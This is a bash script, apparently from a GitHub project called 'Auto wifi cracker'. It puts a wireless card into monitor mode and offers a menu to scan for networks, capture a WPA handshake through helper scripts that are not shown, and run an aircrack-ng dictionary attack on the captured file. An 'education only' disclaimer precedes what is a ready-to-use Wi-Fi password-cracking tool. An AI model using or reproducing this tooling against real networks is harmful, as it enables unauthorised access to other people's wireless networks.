#!/bin/bash
sudo airmon-ng start wlan0
clear
    figlet -c Auto wifi carcker |lolcat 
echo " This script create by harsh tagra for more https://github.com/Harsh-Tagra/ "|lolcat -a -d 30
echo 

echo  " $(tput setaf 1)DISCLAMER!THIS TOOL D0ES NOT PROMOTE OR ENCOURAGE ANY ILLEGAL ACTIVES ALL TOOL ARE PROVIDED BY ME MEEAT TO EDUCATION PURPOSE ONLY $(tput sgr 0)"
echo
echo "1.If you not have bssid or chenal number "
echo "2.If you have  chenal number but dont know bssid  "
echo "3.handshake capture"

echo "4.Attack (if you have bssid or chenal number and handshake capture file   ) " 
echo "5.To wifi enable again" 
echo
read -p "Enter option number:  " option 
if [ "$option" = "1" ];
then 

 
  sudo gnome-terminal -x src/./abc.sh  
    
./autodd.sh

elif [ "$option" = "2" ];
then 
  read -p "enter chenal num: " chenalnum
      sudo gnome-terminal -x src/./bc.sh $chenalnum
    
./autodd.sh

elif [ "$option" = "3" ];
then 

  read -p "Enter bssid : " bssid 
    read -p "Enter chenal number : " chenalnum

 read -p "Enter location where you want to save file : " l

   
  sudo gnome-terminal -x src/./rw.sh $bssid $chenalnum  $l 
   sudo gnome-terminal -x src/./bu.sh $bssid 
./autodd.sh   
 elif [ "$option" = "5" ];
then 
 sudo gnome-terminal -x src/./fix.sh 
 
./autodd.sh
   
 elif [ "$option" = "4" ];
  then
  read -p "Enter txt file locaton : " word 
   read -p "Enter caputer file locaton : " txt
   sudo aircrack-ng -w $word $txt |lolcat
 else 
 echo " Not coorect option please enter valid option "|lolcat -a -d 5
 
./autodd.sh

 fi